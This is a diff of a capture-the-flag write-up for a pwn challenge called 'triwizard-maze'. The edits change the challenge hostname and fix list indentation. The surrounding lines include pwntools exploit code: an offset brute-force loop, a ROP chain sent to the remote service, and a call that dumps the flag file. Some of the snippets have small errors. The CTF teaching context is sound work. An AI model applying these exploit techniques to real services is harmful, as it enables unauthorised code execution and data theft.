@@ -46,7 +46,7 @@ from pwn import *
 context(arch='i386')
 
 for offset in range(0, 0x100000, 0x1000):
-	REMOTE = remote('triwizard-maze.challs.cyberchallenge.it', 38202)
+	REMOTE = remote('triwizard-maze.challs.external.open.ecsc2024.it', 38202)
 	REMOTE.recvuntil(b'print(const void *buf, size_t n) is at ')
 	print_fn = int(r.recvline(), 0)
 
@@ -71,7 +71,7 @@ in one go, assuming that the remote will crash as soon as it tries to read past
 the end of the mapped ELF. Either approach works.
 
 ```python
-REMOTE = remote('triwizard-maze.challs.cyberchallenge.it', 38202)
+REMOTE = remote('triwizard-maze.challs.external.open.ecsc2024.it', 38202)
 chain = flat(print_fn, 0, base, 0x10000)
 REMOTE.sendlineafter(b'):\n', chain.ljust(1024))
 
@@ -466,9 +466,8 @@ a recursive [DFS][wiki-dfs] is the simplest way to go:
   `openat(AT_FDCWD, "entry", O_RDONLY, 0)`.
 - Iterate the entries of the current directory.
 - For each entry:
-- If its name is `"triwizard_cup"`, open and dump the file with `dumpfd()`.
-- Otherwise, it's a directory: open it, explore it recursively and finally
-  close it.
+  - If its name is `"triwizard_cup"`, open and dump the file with `dumpfd()`.
+  - Otherwise, it's a directory: open it, explore it recursively and finally close it.
 
 Since the program closes every file descriptor higher than `1` after creating
 the maze, and `open`/`openat` always return the lowest free FD number, we know
@@ -507,7 +506,7 @@ Finally! Now let's get the flag:
 ```python
 from pwnlib.constants.linux.i386 import AT_FDCWD
 
-REMOTE = remote('triwizard-maze.challs.cyberchallenge.it', 38202)
+REMOTE = remote('triwizard-maze.challs.external.open.ecsc2024.it', 38202)
 
 openat(AT_FDCWD 'entry') # -> this will return FD 2
 flag = explore_maze(2)
